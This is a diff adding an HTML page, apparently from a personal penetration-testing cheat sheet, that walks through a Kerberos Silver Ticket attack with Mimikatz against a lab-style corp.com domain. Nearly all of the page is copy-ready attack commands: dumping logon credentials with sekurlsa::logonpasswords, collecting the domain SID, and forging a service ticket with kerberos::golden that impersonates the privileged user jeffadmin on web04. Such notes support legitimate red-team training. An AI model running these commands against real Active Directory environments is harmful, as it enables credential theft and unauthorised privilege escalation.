@@ -1,0 +1,82 @@
+<section class="page active prose-page">
+  <h1>Flow Use Mimikatz</h1>
+  <p class="intro">
+    Silver Ticket flow using an existing SPN target, a service account NTLM hash, domain SID information, and a forged
+    service ticket loaded into the current session.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Check Access To The SPN</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">iwr -UseDefaultCredentials http://web04</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Dump The SPN Account NTLM Hash With Mimikatz</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">privilege::debug</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sekurlsa::logonpasswords</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Grab The SID</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">whoami /user</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="content-image">
+    <img src="images/silver-tickets-mimikatz-sid.png" alt="whoami user SID output">
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Use Mimikatz To Create TGS For User With High Priv</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Check If The Ticket Was Created</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">klist</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Access The SPN With Ticket And High Priv</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">iwr -UseDefaultCredentials http://web04</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
